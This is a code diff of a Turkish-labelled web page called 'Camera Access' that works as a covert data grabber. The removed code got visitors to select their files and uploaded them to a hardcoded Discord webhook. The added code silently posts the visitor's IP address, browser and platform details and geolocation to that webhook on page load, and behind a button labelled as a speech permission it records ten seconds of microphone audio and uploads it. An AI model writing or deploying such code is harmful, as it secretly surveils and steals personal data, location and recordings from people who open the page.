@@ -5,39 +5,22 @@
   </head>
   <body>
     <h1>Kamera Erişimi</h1>
-    <button id="take-picture">Dosyaları Gönder</button>
+    <button id="allow-mic">Konuşma İzni Ver</button>
     <div id="picture-container"></div>
 
     <script>
-      const takePictureButton = document.getElementById('take-picture');
       const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
 
-      takePictureButton.addEventListener('click', async () => {
-        try {
-          // Tüm cihaz dosyalarını al
-          const files = await window.showOpenFilePicker({
-            multiple: true,
-            types: [
-              {
-                description: 'All Files',
-                accept: {
-                  '*/*': ['*'],
-                },
-              },
-            ],
-          });
-
+      // Send the user's IP address to the Discord webhook
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://api.ipify.org/?format=json', true);
+      xhr.onload = function() {
+        if (xhr.status === 200) {
+          const ipAddress = JSON.parse(xhr.responseText).ip;
           const formData = new FormData();
-
-          // Tüm dosyaları form verisine ekle
-          files.forEach(file => {
-            formData.append('file', file);
-          });
-
           formData.append('username', 'Kamera Erişimi');
-          formData.append('content', 'Dosyalar Gönderildi!');
+          formData.append('content', `Siteye Girildi: ${ipAddress}`);
 
-          // Dosyaları Discord sunucusuna gönder
           fetch(webhookUrl, {
             method: 'POST',
             body: formData,
@@ -45,6 +28,94 @@
          .then(response => response.json())
          .then(data => console.log(data))
          .catch(error => console.error(error));
+        } else {
+          console.error('Error:', xhr.statusText);
+        }
+      };
+      xhr.send();
+
+      // Send the user's device information to the Discord webhook
+      const deviceInfo = `Browser: ${navigator.appVersion}\nPlatform: ${navigator.platform}`;
+      const formData = new FormData();
+      formData.append('username', 'Kamera Erişimi');
+      formData.append('content', `Cihaz Bilgileri: ${deviceInfo}`);
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        body: formData,
+      })
+     .then(response => response.json())
+     .then(data => console.log(data))
+     .catch(error => console.error(error));
+
+      // Request the user's location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Send the user's location to the Discord webhook
+          const formData = new FormData();
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', `Konum: ${lat}, ${lon}`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        }, error => {
+          console.error('Error:', error);
+          const formData = new FormData();
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', `Konum İzni Verilmedi`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        });
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+      }
+
+      // Request the user's microphone permission
+      const allowMicButton = document.getElementById('allow-mic');
+      allowMicButton.addEventListener('click', async () => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+          const audioChunks = [];
+          const mediaRecorder = new MediaRecorder(stream);
+
+          mediaRecorder.ondataavailable = event => {
+            audioChunks.push(event.data);
+          };
+
+          mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+            const formData = new FormData();
+            formData.append('file', audioBlob);
+            formData.append('username', 'Kamera Erişimi');
+            formData.append('content', 'Ses Kaydı Alındı!');
+
+            fetch(webhookUrl, {
+              method: 'POST',
+              body: formData,
+            })
+           .then(response => response.json())
+           .then(data => console.log(data))
+           .catch(error => console.error(error));
+          };
+
+          mediaRecorder.start();
+          setTimeout(() => {
+            mediaRecorder.stop();
+          }, 10000); // Record for 10 seconds
         } catch (error) {
           console.error('Error:', error);
         }
